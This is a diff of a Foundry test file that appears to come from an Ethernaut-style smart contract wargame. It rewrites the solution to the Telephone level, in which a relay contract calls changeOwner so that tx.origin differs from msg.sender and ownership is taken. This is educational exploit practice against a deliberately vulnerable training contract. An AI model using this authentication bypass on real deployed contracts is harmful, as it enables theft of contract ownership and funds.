@@ -24,8 +24,9 @@ contract TestTelephone is BaseTest {
     }
 
     function setupLevel() internal override {
-        /** CODE YOUR SETUP HERE */
-
+        /**
+         * CODE YOUR SETUP HERE
+         */
         levelAddress = payable(this.createLevelInstance(true));
         level = Telephone(levelAddress);
 
@@ -34,26 +35,27 @@ contract TestTelephone is BaseTest {
     }
 
     function exploitLevel() internal override {
-        /** CODE YOUR EXPLOIT HERE */
+        /**
+         * CODE YOUR EXPLOIT HERE
+         */
+
+        // This level plays on the fact that tx.origin and msg.sender are different.
+        // To solve, player has to become tx.origin
 
         vm.startPrank(player, player);
 
-        // Deploy the Exploiter contract
-        Exploiter exploiter = new Exploiter();
+        // Deploy relayer contract
+        Relayer relayer = new Relayer();
 
-        // make the exploiter call the underlying Level. In this case the `msg.sender` from Level.changeOwner is the `Exploiter`
-        // but the `tx.origin` is the user itself who have called the `Exploiter` that has called the `Telephone` contract
-        // More info:
-        // - https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/tx-origin/
-        // - https://docs.soliditylang.org/en/develop/security-considerations.html#tx-origin
-        exploiter.exploit(level);
+        // Call via relayer contract
+        relayer.callTelephone(level, player);
 
         vm.stopPrank();
     }
 }
 
-contract Exploiter {
-    function exploit(Telephone level) public {
-        level.changeOwner(msg.sender);
+contract Relayer {
+    function callTelephone(Telephone _target, address _owner) external {
+        _target.changeOwner(_owner);
     }
 }
